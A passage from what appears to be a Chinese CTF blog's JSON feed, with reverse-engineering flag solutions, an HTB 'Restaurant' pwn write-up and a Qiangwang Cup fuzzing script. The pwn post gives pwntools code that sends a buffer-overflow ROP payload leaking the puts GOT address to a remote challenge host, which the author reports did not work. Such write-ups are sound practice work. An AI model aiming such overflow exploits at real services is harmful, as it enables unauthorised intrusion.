class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">int  sub_4010F0(char* a1, int a2, int a3)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int result; // eax</span><br><span class=\"line\">  int i; // esi</span><br><span class=\"line\">  int v5; // ecx</span><br><span class=\"line\">  int v6; // edx</span><br><span class=\"line\"></span><br><span class=\"line\">  result = a3;</span><br><span class=\"line\">  for ( i = a2; i &lt;= a3; a2 = i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v5 = i;</span><br><span class=\"line\">    v6 = i[a1];</span><br><span class=\"line\">    if ( a2 &lt; result &amp;&amp; i &lt; result )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      do</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        if ( v6 &gt; a1[result]) </span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          if ( i &gt;= result )</span><br><span class=\"line\">            break;</span><br><span class=\"line\">          ++i;</span><br><span class=\"line\">          a1[v5] = a1[result];</span><br><span class=\"line\">          if ( i &gt;= result )</span><br><span class=\"line\">            break;</span><br><span class=\"line\">          while ( a1[i] &lt;= v6 )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            if ( ++i &gt;= result )</span><br><span class=\"line\">              goto LABEL_13;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          if ( i &gt;= result )</span><br><span class=\"line\">            break;</span><br><span class=\"line\">          v5 = i;</span><br><span class=\"line\">         a1[result] = a1[i];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        --result;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      while ( i &lt; result );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">LABEL_13:</span><br><span class=\"line\">    a1[result] = v6 ;</span><br><span class=\"line\">    sub_4010F0(a1, a2, i - 1);</span><br><span class=\"line\">    result = a3;</span><br><span class=\"line\">    ++i;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar str[] = &quot;ZJSECaNH3ng&quot;;</span><br><span class=\"line\">\tsub_4010F0(str,0,10);</span><br><span class=\"line\">\tprintf(&quot;%s&quot;, str);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>得到加密后的字符串</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if ( String[0] == v7[0] + 34</span><br><span class=\"line\">  &amp;&amp; String[1] == v10</span><br><span class=\"line\">  &amp;&amp; 4 * String[2] - 141 == 3 * v8</span><br><span class=\"line\">  &amp;&amp; String[3] / 4 == 2 * (v13 / 9)</span><br><span class=\"line\">  &amp;&amp; !strcmp(v4, &quot;ak1w&quot;)</span><br><span class=\"line\">  &amp;&amp; !strcmp(v5, &quot;V1Ax&quot;) )</span><br></pre></td></tr></table></figure></p>\n<p>通过这几个判断即可得到 flag</p>\n<h4 id=\"简单注册器\"><a class=\"anchor\" href=\"#简单注册器\">#</a> 简单注册器</h4>\n<p>这个题很好做</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xx.length() == 32 &amp;&amp; xx.charAt(31) == &#x27;a&#x27; &amp;&amp; xx.charAt(1) == &#x27;b&#x27; &amp;&amp; (xx.charAt(0) + xx.charAt(2)) + (-48) == 56) </span><br></pre></td></tr></table></figure></p>\n<p>满足这个或者</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">x = list(&quot;dd2940c04462b4dd7c450528835cca15&quot;)</span><br><span class=\"line\">x=[ord(i) for i in x]</span><br><span class=\"line\"></span><br><span class=\"line\">x[2] =((x[2] + x[3]) - 50)</span><br><span class=\"line\">x[4] =((x[2] + x[5]) - 48)</span><br><span class=\"line\">x[30] =((x[31] + x[9]) - 48)</span><br><span class=\"line\">x[14] =((x[27] + x[28]) - 97)</span><br><span class=\"line\">for i in range(16):</span><br><span class=\"line\">    a=x[31-i]</span><br><span class=\"line\">    x[31-i]=x[i]</span><br><span class=\"line\">    x[i]=a</span><br><span class=\"line\">x=&quot;&quot;.join(chr(i) for i in x)</span><br><span class=\"line\">print(x)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>得到 flag</p>\n<h4 id=\"gwctf-2019pyre\"><a class=\"anchor\" href=\"#gwctf-2019pyre\">#</a> [GWCTF 2019]pyre</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=[&#x27;\\x1f&#x27;, &#x27;\\x12&#x27;, &#x27;\\x1d&#x27;, &#x27;(&#x27;, &#x27;0&#x27;, &#x27;4&#x27;, &#x27;\\x01&#x27;, &#x27;\\x06&#x27;, &#x27;\\x14&#x27;, &#x27;4&#x27;, &#x27;,&#x27;, &#x27;\\x1b&#x27;, &#x27;U&#x27;, &#x27;?&#x27;, &#x27;o&#x27;, &#x27;6&#x27;, &#x27;*&#x27;, &#x27;:&#x27;, &#x27;\\x01&#x27;, &#x27;D&#x27;, &#x27;;&#x27;, &#x27;%&#x27;, &#x27;\\x13&#x27;]</span><br><span class=\"line\">l = len(a)</span><br><span class=\"line\">a=[ord(i) for i in a]</span><br><span class=\"line\">for i in range(l-2,-1,-1):</span><br><span class=\"line\">    a[i] = a[i] ^ a[i +1]</span><br><span class=\"line\">c=&#x27;&#x27;</span><br><span class=\"line\">for i in range(l):</span><br><span class=\"line\">     num = (a[i] - i)%128</span><br><span class=\"line\">     c += chr(num)</span><br><span class=\"line\"></span><br><span class=\"line\">print(c)</span><br></pre></td></tr></table></figure></p>\n<p>要注意是怎么异或的</p>\n<h4 id=\"actf新生赛2020easyre\"><a class=\"anchor\" href=\"#actf新生赛2020easyre\">#</a> [ACTF 新生赛 2020] easyre</h4>\n<p>注意 c 的内存</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v4=&quot;*F&#x27;\\&quot;N,\\&quot;(I?+@&quot;</span><br><span class=\"line\">a=[chr(i) for i in range(32,127)]</span><br><span class=\"line\">a=&quot;&quot;.join(a[::-1])</span><br><span class=\"line\">b=&#x27;&#x27;</span><br><span class=\"line\">print(a)</span><br><span class=\"line\">for i in range(len(v4)):</span><br><span class=\"line\">    b+=chr(a.index(v4[i])+1)</span><br><span class=\"line\">print(&quot;flag&#123;&quot;+b+&quot;&#125;&quot;)</span><br><span class=\"line\"># v4 = &quot;*F&#x27;\\&quot;N,\\&quot;(I?+@&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"># d = chr(0x7e) + &quot;&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&quot; + chr(0x27) + &quot;&amp;%&quot; + &#x27;$# !&quot;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># s = &quot;&quot;</span><br><span class=\"line\"># for i in range(12):</span><br><span class=\"line\">#     s += chr(d.index(v4[i]) + 1)</span><br><span class=\"line\"># print(&quot;flag&#123;&quot; + s + &quot;&#125;&quot;)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>第一个不知道为什么有点问题</p>\n<h4 id=\"findit\"><a class=\"anchor\" href=\"#findit\">#</a> findit</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=[&#x27;p&#x27;, &#x27;v&#x27;, &#x27;k&#x27;, &#x27;q&#x27;, &#x27;&#123;&#x27;, &#x27;m&#x27;, &#x27;1&#x27;, &#x27;6&#x27;, &#x27;4&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;2&#x27;, &#x27;6&#x27;, &#x27;2&#x27;, &#x27;0&#x27;, &#x27;3&#x27;, &#x27;3&#x27;, &#x27;l&#x27;, &#x27;4&#x27;, &#x27;m&#x27;, &#x27;4&#x27;, &#x27;9&#x27;, &#x27;l&#x27;, &#x27;n&#x27;, &#x27;p&#x27;, &#x27;7&#x27;, &#x27;p&#x27;, &#x27;9&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;k&#x27;, &#x27;2&#x27;, &#x27;8&#x27;, &#x27;k&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;&#125;&#x27;]</span><br><span class=\"line\">print(&quot;&quot;.join(a))</span><br></pre></td></tr></table></figure></p>\n<p>每个字符 ord-10 即可得到 flag</p>\n<h4 id=\"flareon4login\"><a class=\"anchor\" href=\"#flareon4login\">#</a> [FlareOn4]login</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE Html /&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;head&gt;</span><br><span class=\"line\">        &lt;title&gt;FLARE On 2017&lt;/title&gt;</span><br><span class=\"line\">    &lt;/head&gt;</span><br><span class=\"line\">    &lt;body&gt;</span><br><span class=\"line\">        &lt;input type=&quot;text&quot; name=&quot;flag&quot; id=&quot;flag&quot; value=&quot;Enter the flag&quot; /&gt;</span><br><span class=\"line\">        &lt;input type=&quot;button&quot; id=&quot;prompt&quot; value=&quot;Click to check the flag&quot; /&gt;</span><br><span class=\"line\">        &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">            document.getElementById(&quot;prompt&quot;).onclick = function () &#123;</span><br><span class=\"line\">                var flag = document.getElementById(&quot;flag&quot;).value;</span><br><span class=\"line\">                var rotFlag = flag.replace(/[a-zA-Z]/g, function(c)&#123;return String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26);&#125;);</span><br><span class=\"line\">                if (&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot; == rotFlag) &#123;</span><br><span class=\"line\">                    alert(&quot;Correct flag!&quot;);</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                    alert(rotFlag);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &lt;/script&gt;</span><br><span class=\"line\">    &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">把PyvragFvqrYbtvafNerRnfl@syner-ba.pbz传入进去得到flag</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"wustctf2020level1\"><a class=\"anchor\" href=\"#wustctf2020level1\">#</a> [WUSTCTF2020]level1</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file=open(&quot;output.txt&quot;,&quot;r&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(1,20):</span><br><span class=\"line\"></span><br><span class=\"line\">    flag=file.readline()</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">    if i&amp;1!=0:</span><br><span class=\"line\"></span><br><span class=\"line\">        print(chr(int(flag)&gt;&gt;i),end=&quot;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">    else:</span><br><span class=\"line\"></span><br><span class=\"line\">        print(chr(int(flag)//i),end=&quot;&quot;)</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "reverse"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Restauran/",
            "url": "https://lookhui.github.io/HTB-Restauran/",
            "title": "HTB-Restauran",
            "date_published": "2023-12-18T04:35:55.000Z",
            "content_html": "<h1 id=\"restauran\"><a class=\"anchor\" href=\"#restauran\">#</a> Restauran</h1>\n<p>一直刷渗透多无聊在玩玩 pwn 来感受 pwnpwn 的乐趣</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arch:     amd64-64-little</span><br><span class=\"line\">RELRO:    Full RELRO</span><br><span class=\"line\">Stack:    No canary found</span><br><span class=\"line\">NX:       NX enabled</span><br><span class=\"line\">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>\n<p>没有开 stack 和 pie</p>\n<p>运行看看</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">🥡 Welcome to Rocky Restaurant 🥡</span><br></pre></td></tr></table></figure></p>\n<p>应该是一个餐厅管理系统</p>\n<p>使用 ida64 进行调试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v3; // ecx</span><br><span class=\"line\">  int v4; // er8</span><br><span class=\"line\">  int v5; // er9</span><br><span class=\"line\">  int v6; // edx</span><br><span class=\"line\">  int v7; // ecx</span><br><span class=\"line\">  int v8; // er8</span><br><span class=\"line\">  int v9; // er9</span><br><span class=\"line\">  __int64 v10; // rdx</span><br><span class=\"line\">  int v11; // ecx</span><br><span class=\"line\">  int v12; // er8</span><br><span class=\"line\">  int v13; // er9</span><br><span class=\"line\">  int v15; // [rsp+Ch] [rbp-4h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  setup();</span><br><span class=\"line\">  color((unsigned int)&amp;unk_401250, (unsigned int)&quot;cyan&quot;, (unsigned int)&quot;bold&quot;, v3, v4, v5);</span><br><span class=\"line\">  color((unsigned int)&quot;\\nWhat would you like?&quot;, (unsigned int)&quot;green&quot;, v6, v7, v8, v9);</span><br><span class=\"line\">  printf(&quot;\\n1. Fill my dish.\\n2. Drink something\\n&gt; &quot;);</span><br><span class=\"line\">  __isoc99_scanf(&amp;unk_401226, &amp;v15);</span><br><span class=\"line\">  if ( v15 == 1 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    fill((__int64)&amp;unk_401226, (__int64)&amp;v15, v10, v11, v12, v13);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  else</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    if ( v15 != 2 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      color((unsigned int)&quot;\\nInvalid option! Exiting..\\n&quot;, (unsigned int)&quot;red&quot;, (unsigned int)&quot;bold&quot;, v11, v12, v13);</span><br><span class=\"line\">      exit(261);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    drink((__int64)&amp;unk_401226, (__int64)&amp;v15, v10, v11, v12, v13);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个是 main 函数里面的</p>\n<p>fill</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __fastcall fill(__int64 a1, __int64 a2, __int64 a3, int a4, int a5, int a6)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int v6; // ecx</span><br><span class=\"line\">  int v7; // er8</span><br><span class=\"line\">  int v8; // er9</span><br><span class=\"line\">  __int64 buf; // [rsp+0h] [rbp-20h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  color(</span><br><span class=\"line\">    (unsigned int)&quot;\\nYou can add these ingredients to your dish:&quot;,</span><br><span class=\"line\">    (unsigned int)&quot;green&quot;,</span><br><span class=\"line\">    (unsigned int)&quot;bold&quot;,</span><br><span class=\"line\">    a4,</span><br><span class=\"line\">    a5,</span><br><span class=\"line\">    a6,</span><br><span class=\"line\">    0LL,</span><br><span class=\"line\">    0LL,</span><br><span class=\"line\">    0LL,</span><br><span class=\"line\">    0LL);</span><br><span class=\"line\">  puts(::a1);</span><br><span class=\"line\">  color((unsigned int)&quot;You can also order something else.\\n&gt; &quot;, (unsigned int)&quot;green&quot;, (unsigned int)&quot;bold&quot;, v6, v7, v8);</span><br><span class=\"line\">  read(0, &amp;buf, 0x400uLL);</span><br><span class=\"line\">  return printf(&quot;\\nEnjoy your %s&quot;, (const char *)&amp;buf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个漏洞点很简单就是 ret2libc 但是我一直打印不出栈地址，很难受</p>\n<p>drink</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __fastcall drink(__int64 a1, __int64 a2, int a3, int a4, int a5, int a6)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  const char *v6; // rax</span><br><span class=\"line\">  int v8; // [rsp+Ch] [rbp-4h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  v8 = 0;</span><br><span class=\"line\">  color((unsigned int)&quot;\\nWhat beverage would you like?&quot;, (unsigned int)&quot;green&quot;, a3, a4, a5, a6);</span><br><span class=\"line\">  printf(a1Water2);</span><br><span class=\"line\">  __isoc99_scanf(&amp;unk_401226, &amp;v8);</span><br><span class=\"line\">  if ( v8 == 1 || v8 == 2 )</span><br><span class=\"line\">    v6 = &quot;\\nEnjoy your drink!&quot;;</span><br><span class=\"line\">  else</span><br><span class=\"line\">    v6 = &quot;\\nInvalid option&quot;;</span><br><span class=\"line\">  return puts(v6);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里的话就是 puts (v6 是需要注意的点)</p>\n<p>写到了这里发现行不通</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class=\"line\">elf=ELF(&quot;./restaurant&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(b&quot;./libc.so.6&quot;)</span><br><span class=\"line\">#p=process(b&quot;./restaurant&quot;)</span><br><span class=\"line\">p=remote(&quot;167.99.85.216&quot;,32579)</span><br><span class=\"line\">puts=elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\">ret=0x40063e</span><br><span class=\"line\">rdi_pop=0x4010a3</span><br><span class=\"line\">fill=0x400E4A</span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20+0x8)+p64(rdi_pop)+p64(puts_got)+p64(puts)+p64(fill)</span><br><span class=\"line\">p.recvuntil(b&quot;&gt;&quot;)</span><br><span class=\"line\">p.sendline(str(1))</span><br><span class=\"line\">p.recvuntil(b&quot;&gt;&quot;)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">#p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;)</span><br><span class=\"line\">a=p.recvline()</span><br><span class=\"line\">a+=p.recvline()</span><br><span class=\"line\">d=p.recvline()</span><br><span class=\"line\">print(d)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>发现 pwn 原来也这么难有点环境问题就 gg</p>\n",
            "tags": [
                "PWN"
            ]
        },
        {
            "id": "https://lookhui.github.io/%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/",
            "url": "https://lookhui.github.io/%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/",
            "title": "第七届强网杯wp",
            "date_published": "2023-12-17T08:08:10.000Z",
            "content_html": "<h1 id=\"第七届强网杯全国网络安全挑战赛\"><a class=\"anchor\" href=\"#第七届强网杯全国网络安全挑战赛\">#</a> 第七届 &quot;强网杯&quot; 全国网络安全挑战赛</h1>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> misc</h2>\n<h3 id=\"easyfuzz\"><a class=\"anchor\" href=\"#easyfuzz\">#</a> easyfuzz</h3>\n<p>通过 nc 连接的</p>\n<p>满足为全部都是 1 后就能得到 flag</p>\n<p>首先一个一个试拿 0 试然后到 Z 可以试出必须为 9 位并且前面两位是什么都行</p>\n<p>exp</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&quot;101.200.122.251&quot;,12199)</span><br><span class=\"line\">bb=9</span><br><span class=\"line\">cc=&quot;&quot;</span><br><span class=\"line\">vv=111111001</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">for j in range(32,128):</span><br><span class=\"line\">                print(&quot;\\n&quot;)</span><br><span class=\"line\">                p.recvuntil(&quot;bytes):&quot;)</span><br><span class=\"line\">                b=chr(j)+chr(j)+&#x27;qwbG&#x27;+chr(j)+chr(j)+&#x27;d&#x27;</span><br><span class=\"line\">                print(b)</span><br><span class=\"line\">                p.sendline(b)</span><br><span class=\"line\">                c=p.recvuntil(&quot;\\n&quot;)[-10:]</span><br><span class=\"line\">                print(c)</span><br><span class=\"line\">                print(type(c))</span><br><span class=\"line\">                if vv != int(c):</span><br><span class=\"line\">                        print(f&quot;得到&#123;b&#125;\\n&#123;c&#125;&quot;)</span><br><span class=\"line\">                        break</span><br><span class=\"line\">                    # bb -= 1</span><br><span class=\"line\">                    # cc += str(chr(j))</span><br><span class=\"line\">                    # with open(&#x27;a.txt&#x27;, &#x27;a&#x27;) as f:</span><br><span class=\"line\">                    #     f.write(vv + &#x27;\\n&#x27;)  # 将vv写入文件</span><br><span class=\"line\">                    #     vv = &#x27;11&#x27; + &#x27;0&#x27; * (bb - 2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"pyjail-its-myfilter\"><a class=\"anchor\" href=\"#pyjail-its-myfilter\">#</a> Pyjail ! It's myFILTER !!!</h3>\n<p>打开后 nc 连接使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag藏在变量文件里面 